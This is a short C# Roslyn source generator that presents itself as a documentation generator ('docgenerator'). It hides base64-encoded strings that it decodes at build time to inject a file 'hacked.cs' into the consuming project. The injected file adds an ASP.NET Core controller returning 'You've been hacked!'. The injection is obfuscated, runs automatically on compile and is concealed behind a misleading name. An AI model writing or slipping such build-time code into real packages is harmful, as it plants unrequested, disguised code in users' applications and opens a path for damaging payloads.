using Microsoft.CodeAnalysis;

namespace docgenerator
{
    [Generator]
    public class GeneratorImpl : ISourceGenerator
    {
        private const string S = "bmFtZXNwYWNlIHdlYi5Db250cm9sbGVyczsKCnB1YmxpYyBjbGFzcyBIYWNrZWRDb250cm9sbGVyIDogTWljcm9zb2Z0LkFzcE5ldENvcmUuTXZjLkNvbnRyb2xsZXIKewogICAgcHVibGljIHN0cmluZyBJbmRleCgpCiAgICB7CiAgICAgICAgcmV0dXJuICJZb3UndmUgYmVlbiBoYWNrZWQhIjsKICAgIH0KfQ==";
        private const string H = "aGFja2Vk.cs";

        public void Execute(GeneratorExecutionContext context)
        {
            var src = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(S));
            context.AddSource(H, Microsoft.CodeAnalysis.Text.SourceText.From(src, System.Text.Encoding.UTF8));
        }

        public void Initialize(GeneratorInitializationContext context)
        {
            
        }
    }
}